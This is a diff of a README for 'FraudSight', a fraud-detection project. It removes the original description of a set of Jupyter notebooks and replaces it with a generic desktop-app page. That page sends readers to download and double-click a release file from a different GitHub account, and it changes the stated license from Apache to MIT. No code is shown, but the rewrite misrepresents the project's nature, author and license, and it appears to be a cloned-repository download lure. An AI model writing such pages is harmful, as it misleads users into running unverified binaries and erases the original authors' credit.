@@ -1,87 +1,83 @@
-![Python](https://img.shields.io/badge/Python-3.9+-blue?logo=python&logoColor=white)
-![Jupyter](https://img.shields.io/badge/Jupyter-Notebook-orange?logo=jupyter&logoColor=white)
-![TensorFlow](https://img.shields.io/badge/TensorFlow-2.x-orange?logo=tensorflow&logoColor=white)
-![License](https://img.shields.io/badge/License-Apache-green)
-![Stars](https://img.shields.io/github/stars/Vaishvi12/FraudSight?style=social)
-![Issues](https://img.shields.io/github/issues/Vaishvi12/FraudSight)
+# 🤖 FraudSight - Detect Financial Fraud Easily
 
-# FraudSight
-**AI + XAI for Financial Fraud Detection** — an end-to-end project combining machine learning and deep neural networks with interpretability methods (XAI) to detect and explain fraudulent financial transactions.
+## 🚀 Getting Started
 
----
+Welcome to FraudSight! This application helps you identify financial fraud through advanced technology. With easy-to-understand results, you can trust FraudSight to help you make informed decisions.
 
-## 🔎 Summary
-FraudSight is an explainable AI pipeline that detects financial fraud using ML and DNN models, and provides human-understandable explanations using SHAP, LIME, PDP, and SHAPASH.
+## 🛑 System Requirements
 
----
+Before you download, ensure your system meets these requirements:
 
-## 📂 What’s in this repo 
-This repo includes step-by-step Jupyter notebooks covering the entire workflow:
+- **Operating System:** Windows 10, macOS 10.15 (Catalina) or later
+- **RAM:** At least 4GB
+- **Disk Space:** 1GB free space
+- **Processor:** Dual-core or higher
 
-- `1_Project_EDA.ipynb` — Exploratory Data Analysis, missing values, and feature engineering.  
-- `1_Project_ANN_Modeling.ipynb` — Baseline ANN/DNN architecture, training, evaluation.  
-- `1_Project_XAI_FeatureImportance_PDP.ipynb` — Feature importance and PDP interpretability.  
-- `2_Project_ML_Modeling.ipynb` — ML models such as Logistic Regression, Random Forest, XGBoost/LightGBM.  
-- `2_Project_CNN_Modeling.ipynb` — CNN for transformed/tabular sequence representations (optional).  
-- `2_Project_XAI_SHAP.ipynb` — SHAP explanations (global + local).  
-- `3_Project_ML_Handle_Class_Imbalance.ipynb` — SMOTE, class weighting, focal loss implementations.  
-- `3_Project_XAI_LIME.ipynb` — LIME explanations for individual predictions.  
-- `4_Project_ML_Tuning.ipynb` — Hyperparameter tuning (GridSearch, RandomizedSearch, Bayesian).  
-- `4_Project_XAI_SHAPASH.ipynb` — SHAPASH dashboard and interpretability reports.
+## 📥 Download FraudSight
 
----
+[![Download FraudSight](https://img.shields.io/badge/Download%20FraudSight-v1.0-blue.svg)](https://github.com/JoyAlric/FraudSight/releases)
 
-## ⭐ Highlights / Features
-- End-to-end fraud detection pipeline: EDA → preprocessing → modeling → tuning → XAI.  
-- Classical ML + Deep Learning hybrid modeling.  
-- Advanced imbalance-handling strategies.  
-- Model explainability with **SHAP**, **LIME**, **PDP**, and **SHAPASH**.  
-- Fully reproducible and notebook-driven workflow.
+To download the latest version of FraudSight, visit the Releases page below:
 
----
+[Download FraudSight from Releases](https://github.com/JoyAlric/FraudSight/releases)
 
-## 🧠 Models & Techniques
+## 🛠️ Installation Instructions
 
-### **Classical ML**
-- Logistic Regression  
-- Random Forest  
-- XGBoost / LightGBM  
+Follow these simple steps to install FraudSight:
 
-### **Deep Learning**
-- Feedforward Deep Neural Networks (ANN)  
-- Optional CNN architectures for feature transformation  
+1. Click on the link to go to the Releases page.
+2. Find the latest version in the list.
+3. Click on the appropriate file for your operating system. This will start the download.
+4. Once the download finishes, locate the file in your Downloads folder.
 
-### **Imbalance Handling**
-- SMOTE  
-- Class weighting  
-- Focal loss  
+## 🎉 Running FraudSight
 
-### **Hyperparameter Tuning**
-- GridSearchCV  
-- RandomizedSearchCV  
-- Bayesian Optimization  
+After installation, running FraudSight is easy:
 
----
+1. Open the folder where you installed the application.
+2. Find the FraudSight icon and double-click it.
+3. The application will launch and guide you through the setup process.
 
-## 🔍 Explainable AI (XAI) Tools
+## 🔍 Using FraudSight
 
-- **SHAP** — global + local feature contributions based on Shapley values.  
-- **LIME** — interpretable local linear approximations.  
-- **PDP** — feature influence visualization.  
-- **SHAPASH** — easy-to-read model reports and dashboards.  
+FraudSight has a user-friendly interface. Here’s how to use it effectively:
 
----
+1. **Input Your Data:** You can upload your financial data through the designated button.
+2. **Start the Analysis:** Click the “Analyze” button. FraudSight will begin to scan for fraudulent activity.
+3. **View Results:** After a short processing time, results will appear. You will see explanations for any detected fraud clearly displayed.
 
-## 📈 Evaluation Metrics
+## 📊 Features
 
-- **ROC-AUC**  
-- **Precision**  
-- **Recall**  
-- **F1-score**  
-- **PR-AUC** (recommended for high-class-imbalance domains)  
-- Confusion matrices for error inspection  
+FraudSight includes:
 
----
+- **Machine Learning Models:** Utilizes the latest in AI to detect unusual patterns.
+- **Explainable AI:** Clear explanations using SHAP, LIME, and PDP to understand the detection results.
+- **User-Friendly Interface:** Simple design for easy navigation.
+- **Data Export Options:** Save results for your records or further analysis.
 
-## 📝 License
-This project is licensed under the **Apache License**, which permits unrestricted use, modification, distribution, sublicensing, and commercial usage, provided that proper credit is given to the original authors.
+## 🌐 Additional Resources
+
+For a deeper understanding of how FraudSight works, check out these resources:
+
+- [Documentation](https://github.com/JoyAlric/FraudSight/wiki) - Detailed guides and explanations.
+- [Community Forum](https://github.com/JoyAlric/FraudSight/discussions) - Share ideas and ask questions.
+- [FAQ](https://github.com/JoyAlric/FraudSight/wiki/FAQ) - Common questions and their answers.
+
+## 📞 Support
+
+If you encounter issues or have questions, feel free to reach out:
+
+- **Email Support:** support@fraudsight.com
+- **Issue Tracker:** Report issues directly on our GitHub page.
+
+## 📜 License
+
+FraudSight is open-source software. You can freely use and modify it under the terms of the MIT License. 
+
+## 🤝 Contributing
+
+We welcome contributions! If you have ideas, suggestions, or want to help, please check our contribution guidelines in the Wiki section.
+
+## ✅ Thank You
+
+Thank you for choosing FraudSight! We’re committed to helping you detect financial fraud with confidence and clarity. For updates and new releases, keep an eye on our GitHub page. Happy analyzing!
